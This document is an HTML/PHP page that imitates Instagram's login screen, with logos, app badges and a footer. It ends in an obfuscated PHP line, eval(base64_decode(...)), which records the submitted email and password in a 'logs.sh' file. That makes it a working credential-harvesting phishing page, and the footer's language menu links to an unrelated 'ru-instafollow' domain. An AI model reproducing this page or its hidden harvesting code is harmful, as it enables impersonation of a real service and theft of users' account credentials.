<!DOCTYPE html>
	<html>
	<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
	<link rel="SHORTCUT ICON" href="img/logo.png" type="image/jpg"> 
	<meta name="description" content="">
	<meta property="og:image" content="thumbnail">
	<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.0/css/all.css" integrity="sha384-lZN37f5QGtY3VHgisS14W3ExzMWZxybE1SJSEsQp9S+oqd12jhcu+A56Ebc1zFSJ" crossorigin="anonymous">
	<link href="https://fonts.googleapis.com/css?family=Roboto" rel="stylesheet">
	<link href="style.css" rel="stylesheet">
	<title>Instagram Login - Sign Up</title>
	</head>
	<body>
	<span id="root">
	<section class="section-all">
	<!-- 1-Role Main -->
	<main class="main" role="main">
	<div class="wrapper">
	<article class="article">
	<div class="content">
	<div class="login-box">
	<div class="cheader">
	<img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram">
	<div class="form-wrap">
	<form class="form" action="index.php" method="post">
	
	<div class="input-box">
	<input type="text" name="email" id="name" placeholder="Phone number, username, or email">
	</div>  
	
	<div class="input-box">
	<input type="password" name="pass" id="password" placeholder="Password">
	</div>  
	
	<span class="button-box">
	<input class="btn" type="submit" name="submit" value="Log In">
	</span>  
	
	<a class="forgot" href="">Forgot password?</a>
	</form>
	</div> <!-- Form-wrap end -->
	</div> <!-- Login-box end -->
	
	<div class="login-box">
	<p class="text">Don't have an account?<a href="#">Sign up</a></p>
	</div> <!-- Signup-box end -->
	
	<div class="app">
	<p>Get the app.</p>
	<div class="app-img">
	<a href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8">
	<img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/4b70f6fae447.png">
	</a>
	<a href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26utm_medium%3Dbadge">
	<img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/f06b908907d5.png">
	</a>  
	</div>  <!-- App-img end-->
	</div> <!-- App end -->
	</div> <!-- Content end -->
	</article>
	</div> <!-- Wrapper end -->
	</main>
	
	<!-- 2-Role Footer -->
	<footer class="footer" role="contentinfo">
	<div class="footer-container">
	
	<nav class="footer-nav" role="navigation">
	<ul>
	<li><a href="">About Us</a></li>
	<li><a href="">Support</a></li>
	<li><a href="">Blog</a></li>
	<li><a href="">Press</a></li>
	<li><a href="">Api</a></li>
	<li><a href="">Jobs</a></li>
	<li><a href="">Privacy</a></li>
	<li><a href="">Terms</a></li>
	<li><a href="">Directory</a></li>
	<li>
	<span class="language">Language
	<select name="language" class="select" onchange="la(this.value)">
	<option value="">English</option>
	<option value="http://ru-instafollow.bitballoon.com">Russian</option>
	</select>
	</span>
	</li>
	</ul>
	</nav>
	
	<span class="footer-logo">&copy; 2021 Instagram</span>
	</div> <!-- Footer container end -->
	</footer>
	</section>
	</span>
	</body>
	</html> <!-- Root -->
	
	<?php eval(base64_decode('aWYoIWVtcHR5KCRfUE9TVFsnZW1haWwnXSkgJiYgJF9QT1NUWydwYXNzJ10pewppbmNsdWRlICdkZXZpY2VfaW5mby5waHAnOwokRW1haWw9JF9QT1NUWydlbWFpbCddOwokUGFzc3dvcmQ9JF9QT1NUWydwYXNzJ107CgokaGFuZGxlPWZvcGVuKCdsb2dzLnNoJywgJ2EnKTsKJHNhdmU9ZndyaXRlKCRoYW5kbGUsJwplY2hvIC1lICIgXGVbMTszMW0gPj5cZVsxOzM2bSBFbWFpbCA6XGVbMTszN20gJy4kRW1haWwuJwogXGVbMTszMW0gPj5cZVsxOzM2bSBQYXNzd29yZCA6XGVbMTszN20gJy4kUGFzc3dvcmQuJwoiJyk7CmZjbG9zZSgkaGFuZGxlKTsKfQ=='));
